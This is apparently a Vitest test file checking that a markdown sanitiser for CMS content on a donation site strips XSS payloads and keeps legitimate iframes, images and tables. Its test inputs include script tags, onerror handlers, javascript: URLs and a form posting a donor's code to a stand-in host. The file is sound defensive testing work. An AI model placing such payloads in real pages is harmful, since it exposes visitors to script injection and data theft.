import { describe, it, expect } from "vitest";
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkGfm from "remark-gfm";
import remarkRehype from "remark-rehype";
import rehypeRaw from "rehype-raw";
import rehypeSanitize from "rehype-sanitize";
import { toHtml } from "hast-util-to-html";
import type { Root } from "hast";
import { schema } from "../../components/elements/Markdown";

/**
 * Mirrors the plugin chain in Markdown.tsx. react-markdown runs the same
 * remark -> rehype -> raw -> sanitize sequence; this drives it directly so the
 * security behaviour can be asserted without a DOM.
 *
 * What is being protected: CMS content is written by Strapi editors and
 * rendered on every public page, the donation form among them. Anything that
 * survives this pipeline runs in a donor's browser while they are typing their
 * name, email and personal code.
 */
function render(markdown: string): string {
  const processor = unified()
    .use(remarkParse)
    .use(remarkGfm)
    .use(remarkRehype, { allowDangerousHtml: true })
    .use(rehypeRaw)
    .use(rehypeSanitize, schema);

  return toHtml(processor.runSync(processor.parse(markdown)) as Root);
}

describe("Markdown sanitisation", () => {
  describe("blocks script execution", () => {
    it("strips a raw <script> tag", () => {
      const out = render('Hello <script>alert("xss")</script> world');
      expect(out).not.toContain("<script");
      expect(out).not.toContain("alert");
    });

    it("strips inline event handlers", () => {
      const out = render(
        '<img src="https://example.com/a.png" onerror="alert(1)">',
      );
      expect(out).not.toContain("onerror");
      expect(out).not.toContain("alert");
    });

    it("strips javascript: URLs on links", () => {
      const out = render('<a href="javascript:alert(1)">click</a>');
      expect(out).not.toContain("javascript:");
    });

    it("strips a form that would post donor input elsewhere", () => {
      const out = render(
        '<form action="https://evil.example/collect"><input name="idCode"></form>',
      );
      expect(out).not.toContain("<form");
      expect(out).not.toContain("evil.example");

      // The schema permits <input>, but only as a GitHub-style task-list
      // checkbox: it rewrites the element to `disabled type="checkbox"` and
      // namespaces the name to `user-content-*`. With no surviving <form> to
      // submit to, disabled, and unable to be a text field, it cannot capture
      // or exfiltrate anything. Asserted explicitly so that a future schema
      // change which let a real input through would fail here.
      if (out.includes("<input")) {
        expect(out).toContain("disabled");
        expect(out).toContain('type="checkbox"');
        expect(out).not.toContain('name="idCode"');
      }
    });

    it("strips object/embed", () => {
      const out = render(
        '<object data="https://evil.example/x"></object><embed src="https://evil.example/y">',
      );
      expect(out).not.toContain("<object");
      expect(out).not.toContain("<embed");
    });

    it("strips style tags", () => {
      const out = render("<style>body{display:none}</style>");
      expect(out).not.toContain("<style");
    });
  });

  describe("keeps content that is actually in use", () => {
    it("keeps the chart iframe embeds the cause pages rely on", () => {
      const out = render(
        '<iframe src="https://ourworldindata.org/grapher/x" loading="lazy" style="width: 100%; height: 600px; border: 0px none;"></iframe>',
      );
      expect(out).toContain("<iframe");
      expect(out).toContain("https://ourworldindata.org/grapher/x");
      expect(out).toContain("loading=");
      // inline sizing must survive or the embeds collapse
      expect(out).toContain("style=");
    });

    it("still rejects a javascript: iframe source", () => {
      const out = render('<iframe src="javascript:alert(1)"></iframe>');
      expect(out).not.toContain("javascript:");
    });

    it("renders ordinary markdown untouched", () => {
      const out = render(
        "# Title\n\nSome **bold** text and a [link](https://example.com).",
      );
      expect(out).toContain("<h1");
      expect(out).toContain("<strong>bold</strong>");
      expect(out).toContain('href="https://example.com"');
    });

    it("renders GFM tables and lists", () => {
      const out = render("| a | b |\n| - | - |\n| 1 | 2 |\n\n- one\n- two");
      expect(out).toContain("<table>");
      expect(out).toContain("<li>one</li>");
    });

    it("keeps images, which CMS content uses heavily", () => {
      const out = render("![alt](https://res.cloudinary.com/x/image.png)");
      expect(out).toContain("<img");
      expect(out).toContain("res.cloudinary.com");
    });
  });
});
